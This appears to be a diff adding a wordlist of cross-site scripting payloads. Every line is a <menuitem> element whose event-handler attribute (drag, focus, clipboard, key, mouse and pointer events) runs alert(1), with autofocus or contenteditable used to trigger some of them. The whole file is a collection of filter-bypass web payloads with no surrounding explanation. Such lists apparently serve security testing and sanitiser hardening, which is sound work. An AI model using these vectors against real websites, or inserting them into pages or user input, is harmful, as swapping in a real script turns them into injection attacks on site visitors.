@@ -1,0 +1,43 @@
+<menuitem draggable="true" ondrag="alert(1)">test</menuitem>
+<menuitem draggable="true" ondragend="alert(1)">test</menuitem>
+<menuitem draggable="true" ondragenter="alert(1)">test</menuitem>
+<menuitem draggable="true" ondragleave="alert(1)">test</menuitem>
+<menuitem draggable="true" ondragstart="alert(1)">test</menuitem>
+<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>
+<menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem>
+<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>
+<menuitem id=x tabindex=1 ondeactivate=alert(1)></menuitem><input id=y autofocus>
+<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>
+<menuitem id=x tabindex=1 onfocusin=alert(1)></menuitem>
+<menuitem onafterscriptexecute=alert(1)><script>1</script>
+<menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
+<menuitem onbeforecut="alert(1)" contenteditable>test</menuitem>
+<menuitem onbeforepaste="alert(1)" contenteditable>test</menuitem>
+<menuitem onbeforescriptexecute=alert(1)><script>1</script>
+<menuitem onblur=alert(1) tabindex=1 id=x></menuitem><input autofocus>
+<menuitem onclick="alert(1)">test</menuitem>
+<menuitem oncontextmenu="alert(1)">test</menuitem>
+<menuitem oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<menuitem oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<menuitem ondblclick="alert(1)" autofocus tabindex=1>test</menuitem>
+<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>
+<menuitem onkeydown="alert(1)" contenteditable>test</menuitem>
+<menuitem onkeypress="alert(1)" contenteditable>test</menuitem>
+<menuitem onkeyup="alert(1)" contenteditable>test</menuitem>
+<menuitem onmousedown="alert(1)">test</menuitem>
+<menuitem onmouseenter="alert(1)">test</menuitem>
+<menuitem onmouseleave="alert(1)">test</menuitem>
+<menuitem onmousemove="alert(1)">test</menuitem>
+<menuitem onmouseout="alert(1)">test</menuitem>
+<menuitem onmouseover="alert(1)">test</menuitem>
+<menuitem onmouseup="alert(1)">test</menuitem>
+<menuitem onmousewheel=alert(1)>requires scrolling
+<menuitem onpaste="alert(1)" contenteditable>test</menuitem>
+<menuitem onpointerdown=alert(1)>XSS</menuitem>
+<menuitem onpointerenter=alert(1)>XSS</menuitem>
+<menuitem onpointerleave=alert(1)>XSS</menuitem>
+<menuitem onpointermove=alert(1)>XSS</menuitem>
+<menuitem onpointerout=alert(1)>XSS</menuitem>
+<menuitem onpointerover=alert(1)>XSS</menuitem>
+<menuitem onpointerrawupdate=alert(1)>XSS</menuitem>
+<menuitem onpointerup=alert(1)>XSS</menuitem>
